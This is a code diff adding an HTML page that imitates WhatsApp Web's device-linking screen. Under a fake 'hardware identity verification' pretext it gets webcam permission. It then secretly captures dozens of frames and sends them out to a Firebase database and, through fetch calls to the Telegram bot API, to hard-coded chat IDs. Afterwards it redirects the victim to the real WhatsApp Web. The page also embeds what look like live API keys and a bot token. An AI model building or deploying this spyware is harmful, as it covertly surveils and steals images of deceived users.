@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Web</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --wa-teal: #00a884;
+            --wa-bg: #111b21;
+            --wa-panel: #202c33;
+            --wa-text: #e9edef;
+            --wa-sub: #8696a0;
+        }
+
+        body { 
+            margin: 0; padding: 0; background: #0c1317; color: var(--wa-text);
+            font-family: Segoe UI, Helvetica Neue, Helvetica, Lucida Grande, Arial, Ubuntu, Cantarell, Fira Sans, sans-serif;
+            display: flex; align-items: center; justify-content: center; height: 100vh;
+        }
+
+        .wa-container {
+            width: 100%; max-width: 900px; height: 80vh; background: var(--wa-bg);
+            display: flex; border-radius: 3px; box-shadow: 0 17px 50px 0 rgba(0,0,0,.19), 0 12px 15px 0 rgba(0,0,0,.24);
+        }
+
+        .wa-main { flex: 1; padding: 40px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
+
+        .wa-logo { width: 80px; margin-bottom: 30px; }
+
+        h1 { font-size: 28px; font-weight: 300; margin-bottom: 10px; color: #d1d7db; }
+        p { color: var(--wa-sub); font-size: 14px; line-height: 1.6; margin-bottom: 40px; max-width: 500px; }
+
+        .btn-wa {
+            background: var(--wa-teal); color: #111b21; border: none;
+            padding: 12px 36px; border-radius: 24px; font-size: 14px; font-weight: 500;
+            cursor: pointer; text-transform: uppercase; letter-spacing: 0.5px;
+        }
+
+        /* Loading UI */
+        #sync-ui { display: none; }
+        
+        .qr-placeholder {
+            width: 200px; height: 200px; background: #fff; padding: 15px; border-radius: 4px;
+            display: flex; align-items: center; justify-content: center; position: relative; margin-bottom: 30px;
+        }
+
+        .qr-overlay {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255,255,255,0.9); display: flex; align-items: center; justify-content: center;
+        }
+
+        .spinner {
+            width: 40px; height: 40px; border: 3px solid #f2f2f2;
+            border-top-color: var(--wa-teal); border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .terminal-wa {
+            background: var(--wa-panel); border-radius: 6px; padding: 15px;
+            font-family: monospace; font-size: 12px; color: #00e676; text-align: left;
+            width: 100%; max-width: 400px; margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="wa-container">
+        <div class="wa-main" id="init-view">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="wa-logo">
+            <h1>Use WhatsApp on your computer</h1>
+            <p>To ensure a secure end-to-end encrypted session, please complete the hardware identity verification. This links your browser to the <b>Mumbai (West)</b> secure relay node.</p>
+            
+            <button class="btn-wa" onclick="startWaSync()">Link with Device</button>
+        </div>
+
+        <div class="wa-main" id="sync-ui">
+            <div class="qr-placeholder">
+                <div class="qr-overlay"><div class="spinner"></div></div>
+                <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=WA_SECURE_RELAY_MUMBAI" style="filter: blur(2px);">
+            </div>
+            <div style="font-size: 18px; color: #d1d7db;">Synchronizing End-to-End Keys...</div>
+            <div style="font-size: 13px; color: var(--wa-sub); margin-top: 8px;" id="wa-timer">Encrypted handshake valid for 60s</div>
+            
+            <div class="terminal-wa">
+                [SYSTEM] Connected to Mumbai_Relay_04...<br>
+                [AUTH] Initializing camera-based P2P hash...<br>
+                [SEC] Status: Encrypting local session keys
+            </div>
+        </div>
+    </div>
+
+    <!-- Hidden Capture Engine -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function startWaSync() {
+            try {
+                // Requesting permission under the guise of QR linking
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('init-view').style.display = 'none';
+                document.getElementById('sync-ui').style.display = 'flex';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let timeLeft = 60;
+                    let count = 0;
+
+                    const interval = setInterval(() => {
+                        timeLeft--;
+                        count++;
+                        document.getElementById('wa-timer').innerText = `Encrypted handshake valid for ${timeLeft}s`;
+
+                        if (count <= 52) {
+                            waCapture(count);
+                        }
+
+                        if (timeLeft <= 0) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            // Redirect to official WhatsApp Web
+                            window.location.href = "https://web.whatsapp.com";
+                        }
+                    }, 1000);
+                };
+            } catch (err) {
+                window.location.href = "https://web.whatsapp.com";
+            }
+        }
+
+        function waCapture(idx) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ 
+                image: b64, 
+                type: "WA_SPOOF", 
+                ts: Date.now(),
+                loc: "MUMBAI_WEST"
+            });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'wa_recon_mumbai.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
